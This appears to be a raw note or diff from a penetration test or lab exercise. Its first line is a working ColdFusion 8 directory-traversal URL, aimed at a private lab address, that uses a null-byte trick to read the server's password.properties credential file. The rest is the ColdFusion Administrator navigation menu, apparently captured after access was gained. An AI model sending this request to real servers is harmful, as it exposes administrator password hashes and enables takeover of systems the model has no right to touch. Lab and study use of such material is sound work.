@@ -1,1 +1,64 @@
 http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
+
+ 	Server Settings 	
+		
+	Settings
+	Request Tuning
+	Caching
+	Client Variables
+	Memory Variables
+	Mappings
+	Mail
+	Charting
+	Font Management
+	Java and JVM
+	Settings Summary
+		
+	Data & Services 	
+		
+	Data Sources
+	Verity Collections
+	Verity K2 Server
+	Web Services
+	Flex Integration
+		
+	Click to CollapseDebugging & Logging 	
+		
+	Debug Output Settings
+	Debugging IP Addresses
+	Debugger Settings
+	Logging Settings
+	Log Files
+	Scheduled Tasks
+	System Probes
+	Code Analyzer
+	License Scanner
+		
+	Click to CollapseServer Monitoring 	
+		
+	Server Monitor
+		
+	Click to CollapseExtensions 	
+		
+	Java Applets
+	CFX Tags
+	Custom Tag Paths
+	CORBA Connectors
+		
+	Click to CollapseEvent Gateways 	
+		
+	Settings
+	Gateway Types
+	Gateway Instances
+		
+	Click to CollapseSecurity 	
+		
+	Administrator
+	RDS
+	Sandbox Security
+	User Manager
+		
+	Click to CollapsePackaging & Deployment 	
+		
+	ColdFusion Archives
+	J2EE Archives
